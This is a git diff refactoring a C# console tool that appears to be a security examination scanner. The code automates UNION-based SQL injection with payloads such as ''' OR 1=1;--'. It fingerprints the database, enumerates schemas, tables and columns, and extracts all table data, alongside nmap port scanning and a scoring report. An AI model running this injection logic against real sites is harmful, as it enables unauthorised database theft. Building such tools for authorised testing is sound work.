@@ -7,7 +7,6 @@ namespace Vizsgalo
     public class Scanner
     {
         private static string _baseResponse = ""; // this is the base response which makes the base query (for comparing with the injected results later)
-        private static string _latestResponse = ""; // a string variable which contains the latest response result
         
         private static readonly string AsterisksSeparator = new string('*', Console.WindowWidth);
         private const string UnionStart = "'' OR 1=1 UNION SELECT ";
@@ -25,15 +24,11 @@ namespace Vizsgalo
 
         public static async Task Main()
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("Examination started\n");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination started\n");
             
             await StartExamination(_httpClient);
             
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("Examination finished");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Examination finished");
         }
         
         // sends a GET request to the given url and writes the responses to the console
@@ -47,11 +42,11 @@ namespace Vizsgalo
 
             await SetupUnionAndDatabase(httpClient, firstParameter);
 
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine("\nSuccess, " + _db + " is used, database version: " + _dbVersion);
-            Console.WriteLine("Number of extra columns: " + _unionNumber + ", the union section of the query string: " +
-                              _unionColumnsString);
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
+                "\nSuccess, " + _db + " is used, database version: " + _dbVersion);
+            Console.WriteLine();
+            InfoColors.WriteToConsole(InfoColors.SummaryText, 
+                "Number of extra columns: " + _unionNumber + ", the union section of the query string: " + _unionColumnsString);
 
             // execute the commands given by the user (the options are specified below)
             ConsoleKeyInfo key;
@@ -99,9 +94,9 @@ namespace Vizsgalo
                         break;
 
                     // OPTION 8: change target endpoint
-                    case ConsoleKey.D8:
-                        SetEndpoint(httpClient); //TODO
-                        break;
+                    /*case ConsoleKey.D8:
+                        SetEndpoint(httpClient);
+                        break;*/
 
                     // OPTION 9: run a full analysis and calculate a score
                     case ConsoleKey.D9:
@@ -114,133 +109,133 @@ namespace Vizsgalo
         /* ----------------------------------------- Key event handlers --------------------------------------------- */
         static async Task HandleAllSchemas(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nAll schemas in the current database:");
-            Console.ResetColor();
-            await GetAllSchemaNames(httpClient, firstParameter);
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                "\nAll schemas in the current database:");
+            string response = await GetAllSchemaNames(httpClient, firstParameter);
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
         }
 
         static async Task HandleTablesInSchema(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the name of the schema:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the name of the schema:");
             string schemaName = Console.ReadLine() ?? "";
             Console.WriteLine();
             if (schemaName != "")
             {
-                Console.ForegroundColor = ConsoleColor.DarkRed;
-                Console.WriteLine("\nAll tables in the given database:");
-                Console.ResetColor();
-                await GetTableNamesInSchema(httpClient, schemaName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                    "\nAll tables in the given database:");
+                string response = await GetTableNamesInSchema(httpClient, schemaName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
             }
         }
 
         static async Task HandleTableSchemas(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the name of the table:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the name of the table:");
             string tableName = Console.ReadLine() ?? "";
             Console.WriteLine();
             if (tableName != "")
             {
-                Console.ForegroundColor = ConsoleColor.DarkRed;
-                Console.WriteLine("\nThe given table's schema:");
-                Console.ResetColor();
-                await GetTableColumns(httpClient, tableName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                    "\nThe given table's schema:");
+                string response = await GetTableColumns(httpClient, tableName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
             }
         }
 
         static async Task HandleDataFromColumn(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the name of the table:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the name of the table:");
             string tableName = Console.ReadLine() ?? "";
             Console.WriteLine();
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the name of the column:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the name of the column:");
             string columnName = Console.ReadLine() ?? "";
             Console.WriteLine();
             if (tableName != "" && columnName != "")
             {
-                Console.ForegroundColor = ConsoleColor.DarkRed;
-                Console.WriteLine("\nGetting all data from table " + tableName + " from column " +
-                                  columnName);
-                Console.ResetColor();
-                await GetDataFromTableColumn(httpClient, tableName, columnName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                    "\nGetting all data from table " + tableName + " from column " + columnName);
+                string response = await GetDataFromTableColumn(httpClient, tableName, columnName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, response);
             }
         }
 
         static async Task HandleAllDataFromTable(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the name of the database:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the name of the database:");
             string tableName = Console.ReadLine() ?? "";
             Console.WriteLine();
             if (tableName != "")
             {
-                await GetAllDataFromTable(httpClient, tableName, firstParameter);
+                string data = await GetAllDataFromTable(httpClient, tableName, firstParameter);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, data);
             }
         }
 
         static void HandlePortScanning()
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the server's IP address:");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the server's IP address:");
             string address = Console.ReadLine() ?? "";
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("\nEnter the nmap arguments:");
-            Console.ResetColor();
+            
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the nmap arguments:");
             string pars = Console.ReadLine() ?? "";
             string args = pars + " " + address;
+            
             Console.WriteLine();
             if (args != " ")
             {
-                Console.ForegroundColor = ConsoleColor.DarkRed;
-                Console.WriteLine("Scanning " + address + " with these parameters: " + pars);
-                Console.ResetColor();
-                string result = ScanForOperPorts(args);
-                Console.WriteLine(result);
-                Console.ForegroundColor = ConsoleColor.Yellow;
-                Console.WriteLine("Number of open ports: " + Regex.Matches(result, "open").Count);
-                Console.ResetColor();
+                InfoColors.WriteToConsole(InfoColors.ScanningStartText,
+                    "Scanning " + address + " with these parameters: " + pars);
+                string result = ScanForOpenPorts(args);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
+                InfoColors.WriteToConsole(InfoColors.SummaryText,
+                    "Number of open ports: " + Regex.Matches(result, "open").Count);
             }
             else
             {
-                Console.WriteLine("Invalid parameters!");
+                InfoColors.WriteToConsole(InfoColors.StatusError,"Invalid parameters!");
             }
         }
 
-        static void HandleCertificateCheck(HttpClient httpClient)
+        static string HandleCertificateCheck(HttpClient httpClient, bool writeResultToConsole = true)
         {
             string address = httpClient.BaseAddress != null
                 ? httpClient.BaseAddress.ToString()
                 : "localhost";
+            string result = "";
             if (address.Contains("http"))
             {
-                CheckCertificateHttp(address);
+                result = CheckCertificateHttp(address);
             }
             else if (address.Contains("https"))
             {
-                CheckCertificateHttps(address);
+                result = CheckCertificateHttps(address);
             }
             else
             {
                 string httpAddress = "http://" + address;
-                CheckCertificateHttp(httpAddress);
+                result = CheckCertificateHttp(httpAddress);
             }
+
+            if (writeResultToConsole)
+            {
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
+            }
+            
+            return result;
         }
 
         static async Task HandleFullAnalysis(HttpClient httpClient, string firstParameter)
         {
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nRunning full analysis on the target site...");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                "\nRunning full analysis on the target site...");
             await RunFullAnalysis(httpClient, firstParameter);
         }
         /* ---------------------------------------------------------------------------------------------------------- */
@@ -249,26 +244,23 @@ namespace Vizsgalo
         // sets the endpoint given by the user
         static void SetEndpoint(HttpClient httpClient)
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("Enter the endpoint of the target URL (e.g. /Sqlserver/");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "Enter the endpoint of the target URL (e.g. /Sqlserver/");
             string endPoint = Console.ReadLine() ?? "/Sqlserver/";
             if (endPoint == "")
             {
                 endPoint = "/Sqlserver/";
             }
             httpClient.BaseAddress = new Uri(httpClient.BaseAddress + endPoint);
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine("Total base address: " + httpClient.BaseAddress);
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.SummaryText,
+                "Total base address: " + httpClient.BaseAddress);
         }
 
         // gets the URL query parameters from the user
         static string[] GetQueryParameters()
         {
-            Console.ForegroundColor = ConsoleColor.DarkYellow;
-            Console.WriteLine("Enter the query string parameters (separated with ; characters):");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.UserInputHeader,
+                "\nEnter the query string parameters (separated with ; characters):");
             string paramsString = Console.ReadLine() ?? "";
             
             return paramsString.Split(";");
@@ -279,11 +271,8 @@ namespace Vizsgalo
         {
             // gets the base response
             HttpResponseMessage baseResponse = await httpClient.GetAsync("?" + firstParameter + "=" + "'' OR 1=1;--");
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nRequest:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(baseResponse.RequestMessage);
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, baseResponse.RequestMessage!.ToString());
             var jsonBaseResponse = await baseResponse.Content.ReadAsStringAsync();
             _baseResponse = jsonBaseResponse;
         }
@@ -298,37 +287,34 @@ namespace Vizsgalo
             {
                 _unionNumber++;
                 Console.WriteLine();
-                Console.ForegroundColor = ConsoleColor.DarkCyan;
-                Console.WriteLine(_unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
+                InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
+                    _unionNumber + ". attempt: trying the union select with " + _unionNumber + " column(s)...");
+                Console.WriteLine();
                 
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
+                    "Checking for SQL Server or MySql first...");
                 _unionColumnsString = _unionColumnsString == "" ? "'1'" : _unionColumnsString + ",'1'";
                 string unionSqlServerOrMySql = unionUrlBase + _unionColumnsString + ", " + IsSqlServerOrMySql;
-                Console.WriteLine("Checking for SQL Server or MySql first...");
-                Console.ResetColor();
                 
                 unionResponse = await httpClient.GetAsync(unionSqlServerOrMySql);
-                Console.WriteLine(unionResponse.RequestMessage);
+                InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
                 var jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
-                Console.ForegroundColor = unionResponse.StatusCode == HttpStatusCode.OK ? ConsoleColor.DarkGreen : ConsoleColor.Red;
-                Console.WriteLine("Status code: " + unionResponse.StatusCode);
-                Console.ResetColor();
-
+                
+                InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
+                    "Status code: " + unionResponse.StatusCode);
                 if (unionResponse.StatusCode != HttpStatusCode.OK) // if it wasn't SQL Server or MySql then it checks for SQLite
                 {
-                    Console.ForegroundColor = ConsoleColor.DarkCyan;
-                    Console.WriteLine("Checking for SQLite...");
-                    Console.ResetColor();
+                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
+                        "Checking for SQLite...");
                     string unionSqlite = unionUrlBase + _unionColumnsString + ", " + IsSqlite;
                     unionResponse = await httpClient.GetAsync(unionSqlite);
-                    Console.ForegroundColor = ConsoleColor.DarkRed;
-                    Console.WriteLine("\nRequest:");
-                    Console.ForegroundColor = ConsoleColor.DarkCyan;
-                    Console.WriteLine(unionResponse.RequestMessage);
-                    Console.ResetColor();
+                    
+                    InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
+                    InfoColors.WriteToConsole(InfoColors.ResponseResultText, unionResponse.RequestMessage!.ToString());
+                    
                     jsonUnionResponse = await unionResponse.Content.ReadAsStringAsync();
-                    Console.ForegroundColor = unionResponse.StatusCode == HttpStatusCode.OK ? ConsoleColor.DarkGreen : ConsoleColor.Red;
-                    Console.WriteLine("Status code: " + unionResponse.StatusCode);
-                    Console.ResetColor();
+                    InfoColors.WriteToConsole(unionResponse.StatusCode == HttpStatusCode.OK ? InfoColors.StatusSuccess : InfoColors.StatusError, 
+                        "Status code: " + unionResponse.StatusCode);
 
                     if (unionResponse.StatusCode == HttpStatusCode.OK)
                     {
@@ -355,38 +341,33 @@ namespace Vizsgalo
 
         static void PrintCommandList()
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
             Console.WriteLine();
-            Console.WriteLine(AsterisksSeparator);
-                
-            Console.WriteLine("Select an operation to be executed by the application");
-                
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("\nDATABASE OPERATIONS");
-            Console.WriteLine("> Press '1' to get all schema names in the current database");
-            Console.WriteLine("> Press '2' to get all table names in the given schema");
-            Console.WriteLine("> Press '3' to get the given table's schema");
-            Console.WriteLine("> Press '4' to get all data from a specific database column");
-            Console.WriteLine("> Press '5' to get all data from the given database");
-                
-            Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("\nNETWORK AND SERVER OPERATIONS");
-            Console.WriteLine("> Press '6' to scan the server for open ports");
-            Console.WriteLine("> Press '7' to check the validity of the server's certificate");
-                
-            Console.ForegroundColor = ConsoleColor.DarkMagenta;
-            Console.WriteLine("\nCHANGE SETTINGS");
-            Console.WriteLine("> Press '8' to change target endpoint");
-                
-            Console.ForegroundColor = ConsoleColor.Red;
-            Console.WriteLine("\nFULL ANALYSIS");
-            Console.WriteLine("> Press '9' to run a full analysis and read results");
-
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("\n> Press '0' to escape (finish) the examination");
-            Console.WriteLine(AsterisksSeparator);
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
+                AsterisksSeparator + "\nSelect an operation to be executed by the application");
             
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.Operations1,
+                "\nDATABASE OPERATIONS" +
+                "\n> Press '1' to get all schema names in the current database" +
+                "\n> Press '2' to get all table names in the given schema" +
+                "\n> Press '3' to get the given table's schema" +
+                "\n> Press '4' to get all data from a specific database column" +
+                "\n> Press '5' to get all data from the given database");
+                
+            InfoColors.WriteToConsole(InfoColors.Operations2,
+                "\nNETWORK AND SERVER OPERATIONS" +
+                "\n> Press '6' to scan the server for open ports" +
+                "\n> Press '7' to check the validity of the server's certificate");
+                
+            /*Console.ForegroundColor = ConsoleColor.DarkMagenta;
+            Console.WriteLine("\nCHANGE SETTINGS");
+            Console.WriteLine("> Press '8' to change target endpoint");*/
+                
+            InfoColors.WriteToConsole(InfoColors.Operations3,
+                "\nFULL ANALYSIS" +
+                "\n> Press '9' to run a full analysis and read results");
+
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
+                "\n> Press '0' to escape (finish) the examination\n" + AsterisksSeparator);
         }
 
         
@@ -410,9 +391,7 @@ namespace Vizsgalo
                     full score = (injection + ports + certificate) / 3
             */
 
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("Starting auto analysis...");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, "Starting auto analysis...");
 
             // PROCESS 1: test sql injection
             double sqlInjectionScore = await AutoTestSqlInjection(httpClient, firstQueryParameter); // it starts from 0.5 if it got here (the app got the db and the union select with SQL injections)
@@ -434,18 +413,18 @@ namespace Vizsgalo
         static async Task<double> AutoTestSqlInjection(HttpClient httpClient, string firstQueryParameter)
         {
             // STEP 1: get table schemas
-            await GetAllSchemaNames(httpClient, firstQueryParameter);
-            string[] response = _latestResponse.Split(" | ");
+            string schemaNames = await GetAllSchemaNames(httpClient, firstQueryParameter);
+            string[] response = schemaNames.Split(" | ");
             if (response.Length > 0)
             {
                 // STEP 2: get table names in the first schema
-                await GetTableNamesInSchema(httpClient, response[0], firstQueryParameter);
-                response = _latestResponse.Split(" | ");
+                string tableNames = await GetTableNamesInSchema(httpClient, response[0], firstQueryParameter);
+                response = tableNames.Split(" | ");
                 if (response.Length > 0)
                 {
                     // STEP 3: get all data from the first table
-                    await GetAllDataFromTable(httpClient, response[0], firstQueryParameter);
-                    response = _latestResponse.Split(" | ");
+                    string tableData = await GetAllDataFromTable(httpClient, response[0], firstQueryParameter);
+                    response = tableData.Split(" | ");
                     if (response.Length > 0)
                     {
                         return 0;
@@ -460,77 +439,67 @@ namespace Vizsgalo
 
         static double AutoTestPorts()
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("Scanning for open ports...");
-            string result = ScanForOperPorts("");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(result);
-            Console.ForegroundColor = ConsoleColor.Yellow;
+            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Scanning for open ports...");
+            string result = ScanForOpenPorts("");
+            
+            //InfoColors.WriteToConsole(InfoColors.ResponseResultText, result);
+            
             int openPorts = Regex.Matches(result, "open").Count;
-            Console.WriteLine("Number of open ports: " + openPorts);
+            //InfoColors.WriteToConsole(InfoColors.SummaryText, "Number of open ports: " + openPorts);
             
             return openPorts > 10 ? 0 : 1;
         }
 
         static double AutoTestCertificates(HttpClient httpClient)
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("Checking server certificates...");
-            HandleCertificateCheck(httpClient);
-            string[] response = _latestResponse.Split(" | ");
+            InfoColors.WriteToConsole(InfoColors.ScanningStartText, "Checking server certificates...");
+            string result = HandleCertificateCheck(httpClient, false);
+            string[] response = result.Split(" | ");
             
-            return response.Length == 0 ? 0 : 1;
+            return response.Length == 0 || (response.Length == 1 && !response[0].Contains("Expiration")) ? 0 : 1;
         }
 
         
         // displays summaries by processes at the end of the automatic analysis
         static void DisplaySummariesByProcesses(double sqlInjectionScore, double portsScore, double certificateScore)
         {
-            Console.ForegroundColor = ConsoleColor.Blue;
-            Console.WriteLine("\nFull analysis finished! Results by categories:");
+            InfoColors.WriteToConsole(InfoColors.RuntimeInfo, 
+                "\nFull analysis finished! Results by categories:");
             
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nSQL injection score:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
+                "\nSQL injection score:");
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                 AreEqual(sqlInjectionScore, 0.5) ?
                     "It was possible to perform an SQL injection, but could not get any data from the database. Medium security." :
                     AreEqual(sqlInjectionScore, 0.25) ?
                         "It was possible to get all database schemas and the tables in them, but could not get any data from the tables. Low security." :
-                        "It was possible to retrieve all data from the database. Zero security."
-            );
+                        "It was possible to retrieve all data from the database. Zero security.");
             
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nPorts score:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
+                "\nPorts score:");
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText,
                 AreEqual(portsScore, 1.0) ?
                     "The total number of open ports is not higher than 10. Optimal security.":
-                    "The total number of open ports is higher than 10. Low security."
-            );
+                    "The total number of open ports is higher than 10. Low security.");
             
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nCertificates score:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, 
+                "\nCertificates score:");
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, 
                 AreEqual(certificateScore, 1.0) ?
                     "There is at least 1 valid certificate. Optimal security.":
-                    "There are no valid certificates. Zero security."
-            );
+                    "There are no valid certificates. Zero security.");
         }
 
         // displays the overall summary at the end of the automatic analysis
         static void DisplayOverallSummary(double fullScore)
         {
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nOverall score:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(Math.Round(fullScore, 2) * 100 + "%");
+            InfoColors.WriteToConsole(InfoColors.SummaryText, 
+                "\nOverall score:\n" + Math.Round(fullScore, 2) * 100 + "%");
         }
         
         
         /* INDIVIDUAL TASKS */
-        static async Task GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
+        static async Task<string> GetAllSchemaNames(HttpClient httpClient, string firstQueryParameter)
         {
             string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
             if (_db == "sqlserver")
@@ -545,10 +514,11 @@ namespace Vizsgalo
             }
             
             // sends GET request to server
-            await GetRequest(httpClient, url);
+            string[] response = await GetRequest(httpClient, url);
+            return string.Join(" | ", response);
         }
         
-        static async Task GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
+        static async Task<string> GetTableNamesInSchema(HttpClient httpClient, string schemaName, string firstQueryParameter)
         {
             string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
             if (_db == "sqlserver")
@@ -563,10 +533,11 @@ namespace Vizsgalo
             }
             
             // sends GET request to server
-            await GetRequest(httpClient, url);
+            string[] response = await GetRequest(httpClient, url);
+            return string.Join(" | ", response);
         }
         
-        static async Task GetTableColumns(HttpClient httpClient, string tableName, string firstQueryParameter)
+        static async Task<string> GetTableColumns(HttpClient httpClient, string tableName, string firstQueryParameter)
         {
             string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", ";
             if (_db == "sqlserver" || _db == "mysql")
@@ -578,35 +549,56 @@ namespace Vizsgalo
             }
             
             // sends GET request to server
-            await GetRequest(httpClient, url);
+            string[] response = await GetRequest(httpClient, url);
+            return string.Join(" | ", response);
         }
         
-        static async Task GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
+        static async Task<string> GetDataFromTableColumn(HttpClient httpClient, string tableName, string columnName, string firstQueryParameter)
         { 
             string url = "?" + firstQueryParameter + "=" + UnionStart + _unionColumnsString + ", " + columnName + " FROM " + tableName + ";--";
             // sends GET request to server
             Console.WriteLine("Getting all data using " + _db + "...");
-            await GetRequest(httpClient, url);
+            string[] response = await GetRequest(httpClient, url);
+            return string.Join(" | ", response);
         }
         
-        static async Task GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
+        static async Task<string> GetAllDataFromTable(HttpClient httpClient, string tableName, string firstQueryParameter)
         {
             Console.WriteLine("Getting all data using " + _db + "...");
+            
+            string res = await GetTableColumns(httpClient, tableName, firstQueryParameter);
+            string[] columnNames = res.Split(" | ");
 
-            await GetTableColumns(httpClient, tableName, firstQueryParameter);
-            string[] columnNames = _latestResponse.Split(" | ");
-
+            List<string[]> allData = new List<string[]>();
             for (int i = 0; i < columnNames.Length; i++)
             {
-                await GetDataFromTableColumn(httpClient, tableName, columnNames[i], firstQueryParameter);
+                string columnData = await GetDataFromTableColumn(httpClient, tableName, columnNames[i], firstQueryParameter);
+                allData.Add(columnData.Split(" | "));
             }
+
+            if (allData.Count == 0)
+            {
+                return "";
+            }
+            
+            // all columns have the same number of rows
+            int rowNum = allData[0].Length + 1;
+            string[] formattedRows = new string[rowNum];
+            
+            // the first row will be the column names
+            formattedRows[0] = string.Join("\t", columnNames); 
+            
+            for (int i = 1; i < rowNum; i++)
+            {
+                formattedRows[i] = string.Join("\t", allData[i-1]);
+            }
+
+            return string.Join("\n", formattedRows);
         }
 
-        static string ScanForOperPorts(string arguments)
+        static string ScanForOpenPorts(string arguments)
         {
-            Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("\nScanning in progress...");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.ScanningStartText,"\nScanning in progress...");
             string nmapPath = "C:\\Program Files (x86)\\Nmap\\nmap.exe";
             string result;
             
@@ -631,7 +623,7 @@ namespace Vizsgalo
             return result;
         }
 
-        static void CheckCertificateHttp(string address)
+        static string CheckCertificateHttp(string address)
         {
             try
             {
@@ -639,9 +631,8 @@ namespace Vizsgalo
                 {
                     using (HttpClient client = new HttpClient(handler))
                     {
-                        Console.ForegroundColor = ConsoleColor.Cyan;
-                        Console.WriteLine($"Checking {address} for any certificates...");
-                        Console.ResetColor();
+                        InfoColors.WriteToConsole(InfoColors.ScanningStartText,
+                            "Checking " + address + " for any certificates...");
                         HttpResponseMessage response = client.GetAsync(address).Result;
 
                         if (response.IsSuccessStatusCode)
@@ -651,67 +642,57 @@ namespace Vizsgalo
 
                             if(certificates.Count == 0)
                             {
-                                Console.WriteLine("\nThe server did not provide any certificates.");
-                                _latestResponse = "";
+                                return "\nThe server did not provide any certificates.";
                             }
-                            else
+
+                            InfoColors.WriteToConsole(InfoColors.ResponseCategory,
+                                "\nThe server provides these certificates:");
+                            List<string> certificatesList = new List<string>();
+                            for (int i = 0; i < certificates.Count; i++)
                             {
-                                Console.ForegroundColor = ConsoleColor.DarkRed;
-                                Console.WriteLine("\nThe server provides these certificates:");
-                                List<string> certificatesList = new List<string>();
-                                for (int i = 0; i < certificates.Count; i++)
-                                {
-                                    Console.ForegroundColor = ConsoleColor.DarkCyan;
-                                    string expirationDate = certificates[i].GetExpirationDateString();
+                                string expirationDate = certificates[i].GetExpirationDateString();
 
-                                    string certificateResult =
-                                        $"\nCertificate #{i + 1}: {certificates[i]}\nExpiration date: {expirationDate}";
-                                    certificatesList.Add(certificateResult);
-                                    Console.WriteLine(certificateResult);
-                                }
-
-                                _latestResponse = string.Join(" | ", certificatesList);
+                                string certificateResult =
+                                    $"\nCertificate #{i + 1}: {certificates[i]}\nExpiration date: {expirationDate}";
+                                certificatesList.Add(certificateResult);
                             }
+                            return string.Join(" | ", certificatesList);
                         }
-                        else
-                        {
-                            Console.WriteLine($"HTTP request failed with status code: {response.StatusCode}");
-                        }
+
+                        InfoColors.WriteToConsole(InfoColors.StatusError, 
+                            "HTTP request failed with status code: " + response.StatusCode);
                     }
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error: {ex.Message}");
+                InfoColors.WriteToConsole(InfoColors.StatusError, 
+                    "Error: " + ex.Message);
             }
+            return "";
         }
         
-        static void CheckCertificateHttps(string address)
+        static string CheckCertificateHttps(string address)
         {
+            return "";
         }
         
         
         
-        static async Task GetRequest(HttpClient httpClient, string url)
+        static async Task<string[]> GetRequest(HttpClient httpClient, string url)
         {
             using HttpResponseMessage response = await httpClient.GetAsync(url);
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nRequest:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            Console.WriteLine(response.RequestMessage);
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nRequest:");
+            InfoColors.WriteToConsole(InfoColors.ResponseResultText, response.RequestMessage!.ToString());
     
             var jsonResponse = await response.Content.ReadAsStringAsync();
-            Console.ForegroundColor = ConsoleColor.DarkRed;
-            Console.WriteLine("\nResponse:");
-            Console.ForegroundColor = ConsoleColor.DarkCyan;
-            string filteredResponse = FilterResponse(jsonResponse);
-            _latestResponse = filteredResponse;
-            Console.WriteLine($"{filteredResponse}\n");
-            Console.ResetColor();
+            InfoColors.WriteToConsole(InfoColors.ResponseCategory, "\nResponse:");
+            string[] filteredResponse = FilterResponse(jsonResponse);
+            return filteredResponse;
         }
 
 
-        static string FilterResponse(string fullResponse)
+        static string[] FilterResponse(string fullResponse)
         {
             return FilterTableData(GetMiddleSubstring(_baseResponse, fullResponse));
         }
@@ -746,12 +727,13 @@ namespace Vizsgalo
             return ""; // If no middle substring found
         }
 
-        static string FilterTableData(string rawData)
+        static string[] FilterTableData(string rawData)
         {
-            //Console.WriteLine(rawData);
             if (!rawData.Contains("td"))
             {
-                return rawData;
+                string[] raw = new string[1];
+                raw[0] = rawData;
+                return raw;
             }
 
             string[] fields = 
@@ -771,7 +753,7 @@ namespace Vizsgalo
                     finalFields.Add(WebUtility.HtmlDecode(fields[i]));
                 }
             }
-            return string.Join(" | ", finalFields.ToArray());
+            return finalFields.ToArray();
         }
         
         // checks equality between two double values
